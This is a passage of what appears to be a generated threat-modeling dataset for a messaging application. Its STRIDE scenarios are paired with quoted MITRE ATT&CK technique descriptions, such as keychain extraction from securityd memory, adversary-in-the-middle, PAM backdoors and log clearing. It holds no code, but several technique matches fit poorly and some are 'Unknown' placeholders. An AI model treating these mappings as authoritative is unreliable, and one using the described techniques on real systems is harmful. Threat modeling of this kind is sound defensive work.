                "description": "An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",
                "id": "attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72",
                "technique_id": "T1555.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages insufficient permission controls in the desktop client to escalate their permissions and gain admin rights.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient permission controls within the application",
                    "Role": "Application Developer",
                    "Condition": "If permission handling in the desktop client is weak or flawed"
                },
                {
                    "Assumption": "Attacker can manipulate application settings or configurations",
                    "Role": "Attacker",
                    "Condition": "If the application permits unauthorized configuration changes"
                },
                {
                    "Assumption": "Users run the desktop client with higher privileges",
                    "Role": "End User",
                    "Condition": "If users operate the application with administrator rights by default"
                }
            ],
            "Potential Impact": "Unauthorized access to privileged operations and data, potential system compromise",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "admin rights",
                "permission bypass",
                "desktop client"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a zero-day exploit to escalate privileges within the messaging service's backend infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Unknown vulnerabilities exist in the backend infrastructure",
                    "Role": "Application Developer",
                    "Condition": "If the backend infrastructure contains existing but undiscovered flaws"
                },
                {
                    "Assumption": "Attackers have advanced capabilities to identify and exploit zero-day vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "If the attacker is highly skilled and well-resourced"
                },
                {
                    "Assumption": "Security monitoring may not detect advanced threats",
                    "Role": "Security Team",
                    "Condition": "If the monitoring systems are not capable of detecting sophisticated attacks"
                }
            ],
            "Potential Impact": "Full control over backend systems, extensive unauthorized access to data and applications",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day exploit",
                "backend infrastructure",
                "advanced persistent threat"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake public/private key pair and distributes the fake public key claiming to be one of the legitimate entities in the application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate and distribute public keys.",
                    "Role": "Attacker",
                    "Condition": "Attacker activity in key distribution channels"
                },
                {
                    "Assumption": "Users cannot verify the authenticity of public keys independently.",
                    "Role": "User",
                    "Condition": "Lack of robust public key verification mechanisms"
                },
                {
                    "Assumption": "Trust models do not enforce strict validation of public keys.",
                    "Role": "System",
                    "Condition": "System design accepts public keys without stringent validation"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information via man-in-the-middle attacks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "encryption",
                "key exchange",
                "man-in-the-middle",
                "imposter",
                "identification"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to a trusted companion device and uses it to impersonate the legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has physical or remote access to the companion device.",
                    "Role": "Attacker",
                    "Condition": "Device security is compromised"
                },
                {
                    "Assumption": "Companion device authentication mechanisms can be bypassed or are weak.",
                    "Role": "System",
                    "Condition": "Weak or absent secondary authentication protocols"
                },
                {
                    "Assumption": "User credentials are stored or cached insecurely on the companion device.",
                    "Role": "System",
                    "Condition": "Sensitive data stored on devices without robust encryption"
                }
            ],
            "Potential Impact": "Sensitive data disclosure and unauthorized message sending.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device access",
                "credentials",
                "authorized bypass",
                "impersonation"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing to deceive users into providing their authentication credentials for the primary mobile application.",
            "Assumptions": [
                {
                    "Assumption": "Users can be deceived by phishing emails or websites.",
                    "Role": "User",
                    "Condition": "Effective social engineering techniques"
                },
                {
                    "Assumption": "System does not have robust anti-phishing measures.",
                    "Role": "System",
                    "Condition": "Lack of phishing detection tools or training"
                },
                {
                    "Assumption": "Credentials are reused across multiple platforms.",
                    "Role": "User",
                    "Condition": "Weak password hygiene"
                }
            ],
            "Potential Impact": "Unauthorized access to user accounts and sensitive communication data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "social engineering",
                "credential theft",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the encrypted database files on a compromised device to inject malicious payloads that execute upon decrypting.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to the device storage.",
                    "Role": "Attacker",
                    "Condition": "Device security is compromised"
                },
                {
                    "Assumption": "Encrypted databases can be accessed and modified without immediate detection.",
                    "Role": "System",
                    "Condition": "Lack of integrity checking mechanisms"
                },
                {
                    "Assumption": "Replicated changes are accepted without verification.",
                    "Role": "System",
                    "Condition": "Lack of validation of database integrity upon replication"
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to corruption or execution of malicious code.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "malicious payload",
                "file injection",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters messages in transit by compromising the network infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Compromised or controlled network access"
                },
                {
                    "Assumption": "End-to-end encryption does not detect message tampering.",
                    "Role": "System",
                    "Condition": "Encryption process lacks tamper-evident features"
                },
                {
                    "Assumption": "Users are unable to verify message authenticity.",
                    "Role": "User",
                    "Condition": "Lack of authenticity checks on received messages"
                }
            ],
            "Potential Impact": "Data integrity and authenticity are compromised, leading to misinformation and trust erosion.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network infrastructure",
                "message alteration",
                "man-in-the-middle",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains insufficiently protected admin access to a backend server and modifies application code to include a backdoor.",
            "Assumptions": [
                {
                    "Assumption": "Admin credentials are weak or exposed.",
                    "Role": "Attacker",
                    "Condition": "Weak password policies or credential leakage"
                },
                {
                    "Assumption": "Security review processes do not detect unauthorized code changes.",
                    "Role": "System",
                    "Condition": "Lack of robust code audit and review processes"
                },
                {
                    "Assumption": "Server access is inadequately monitored.",
                    "Role": "System",
                    "Condition": "Insufficient logging and real-time monitoring"
                }
            ],
            "Potential Impact": "Data integrity and confidentiality are compromised, enabling persistent unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "backend server",
                "admin access",
                "code modification",
                "backdoor"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a specific sensitive message, claiming the messaging application was compromised.",
            "Assumptions": [
                {
                    "Assumption": "Messaging system does not have strong non-repudiation mechanisms.",
                    "Role": "System",
                    "Condition": "Lack of cryptographic signing on messages"
                },
                {
                    "Assumption": "Users can plausibly claim incidents of compromise.",
                    "Role": "User",
                    "Condition": "System vulnerabilities or precedents of compromise"
                },
                {
                    "Assumption": "Logs are insufficient to verify message origins.",
                    "Role": "System",
                    "Condition": "Inadequate logging or log tampering"
                }
            ],
            "Potential Impact": "Loss of trust and potential legal complications from disputing message authenticity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "non-repudiation",
                "message dispute",
                "authentication",
                "log manipulation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator denies modifying or deleting user data from the service's backend.",
            "Assumptions": [
                {
                    "Assumption": "Backend changes are not logged in an immutable manner.",
                    "Role": "System",
                    "Condition": "Lack of secure logging and change tracking"
                },
                {
                    "Assumption": "Admin actions are not auditable.",
                    "Role": "System",
                    "Condition": "Insufficient role-based auditing and logging"
                },
                {
                    "Assumption": "Multiple administrators share access credentials.",
                    "Role": "Organization",
                    "Condition": "Poor access control and management practices"
                }
            ],
            "Potential Impact": "Data integrity and accountability are compromised, leading to potential misuse and undetected changes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "admin actions",
                "data modification",
                "audit trails",
                "access control"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes having agreed to the terms and conditions after a data breach claims arise.",
            "Assumptions": [
                {
                    "Assumption": "User agreements are weakly authenticated or not logged.",
                    "Role": "System",
                    "Condition": "Deficient in detailed agreement tracking"
                },
                {
                    "Assumption": "Digital agreements are stored insecurely.",
                    "Role": "System",
                    "Condition": "Inadequate protection of agreement records"
                },
                {
                    "Assumption": "Agreement logs can be modified without detection.",
                    "Role": "Attacker or User",
                    "Condition": "Weak security on log files"
                }
            ],
            "Potential Impact": "Legal disputes and potential financial liabilities due to lack of clear user consent records.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user agreements",
                "terms and conditions",
                "data breach",
                "log security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the SQLite database to extract encrypted messages and pre-keys.",
            "Assumptions": [
                {
                    "Assumption": "SQLite database is not sufficiently protected.",
                    "Role": "System",
                    "Condition": "Lack of robust database encryption and access controls"
                },
                {
                    "Assumption": "Known vulnerabilities exist in the SQLite software version.",
                    "Role": "System",
                    "Condition": "Outdated or unpatched SQLite instances"
                },
                {
                    "Assumption": "Exploitation tools are accessible to the attacker.",
                    "Role": "Attacker",
                    "Condition": "Availability of exploitation frameworks or tools"
                }
            ],
            "Potential Impact": "Confidentiality breach exposing sensitive communications and key material.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database exploitation",
                "SQLite",
                "exfiltration",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive communication content is disclosed due to inadequate endpoint device encryption.",
            "Assumptions": [
                {
                    "Assumption": "Endpoint devices do not have full disk encryption enabled.",
                    "Role": "User",
                    "Condition": "Users do not enable or enforce device encryption settings"
                },
                {
                    "Assumption": "Stored messages and keys are not encrypted effectively at rest.",
                    "Role": "System",
                    "Condition": "Weak or absent data-at-rest encryption protocols"
                },
                {
                    "Assumption": "Loss or theft of devices is not promptly mitigated.",
                    "Role": "User",
                    "Condition": "Lack of device tracking or remote wipe capabilities"
                }
            ],
            "Potential Impact": "Unauthorized access to stored sensitive data upon device loss or theft.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "device encryption",
                "data-at-rest",
                "unauthorized access",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider with access to backend systems leaks metadata about user communications externally.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have access to potentially sensitive metadata.",
                    "Role": "Insider",
                    "Condition": "Insufficient role-based access controls"
                },
                {
                    "Assumption": "Metadata is stored and processed without strict protections.",
                    "Role": "System",
                    "Condition": "Weak data protection measures for metadata"
                },
                {
                    "Assumption": "Monitoring and detection of data exfiltration are inadequate.",
                    "Role": "System",
                    "Condition": "Lack of monitoring tools and anomaly detection"
                }
            ],
            "Potential Impact": "Compromise of user privacy and potential for profiling and surveillance.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "insider threat",
                "data leakage",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Clear Mailbox Data",
                "description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)",
                "id": "attack-pattern--438c967d-3996-4870-bfc2-3954752a1927",
                "technique_id": "T1070.008"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A network-based denial-of-service attack overwhelms the messaging service\u2019s servers, rendering them inaccessible.",
            "Assumptions": [
                {
                    "Assumption": "Servers are insufficiently protected against high-volume traffic.",
                    "Role": "System",
                    "Condition": "Lack of adequate load balancing and DDoS protection"
                },
                {
                    "Assumption": "Attackers have sufficient resources to generate significant traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other high-capacity channels"
                },
                {
                    "Assumption": "Service availability monitoring mechanisms are inadequate.",
                    "Role": "System",
                    "Condition": "Lack of real-time monitoring and response capabilities"
                }
            ],
            "Potential Impact": "Service unavailability causing disruption to communication and potential data accessibility issues.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network-based attack",
                "server overload",
                "DDoS",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a protocol flaw to repeatedly trigger resource-intensive operations on the server.",
            "Assumptions": [
                {
                    "Assumption": "The protocol has known flaws or is not designed to prevent such exploitation.",
                    "Role": "System",
                    "Condition": "Protocol vulnerabilities or design issues"
                },
                {
                    "Assumption": "Input validation and error handling mechanisms are weak.",
                    "Role": "System",
                    "Condition": "Insufficient input validation and error handling processes"
                },
                {
                    "Assumption": "Attackers have detailed knowledge of the protocol mechanics.",
                    "Role": "Attacker",
                    "Condition": "Availability of protocol specifications or reverse engineering"
                }
            ],
            "Potential Impact": "Resource exhaustion leading to server crash or severely degraded performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "protocol flaw",
                "resource exhaustion",
                "server crash",
                "performance degradation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker repeatedly sends large message attachments to fill up storage capacity.",
            "Assumptions": [
                {
                    "Assumption": "The system does not effectively limit attachment size or number.",
                    "Role": "System",
                    "Condition": "Lack of effective input limiting mechanisms"
                },
                {
                    "Assumption": "Storage capacity is finite and can be overwhelmed.",
                    "Role": "System",
                    "Condition": "Finite storage capacity with inadequate management"
                },
                {
                    "Assumption": "There are no effective quotas or rate limiting on user activity.",
                    "Role": "System",
                    "Condition": "Absence of effective usage quotas or rate limiting"
                }
            ],
            "Potential Impact": "Storage exhaustion leading to disruption of message storage and retrieval operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "storage exhaustion",
                "message attachments",
                "capacity overload",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
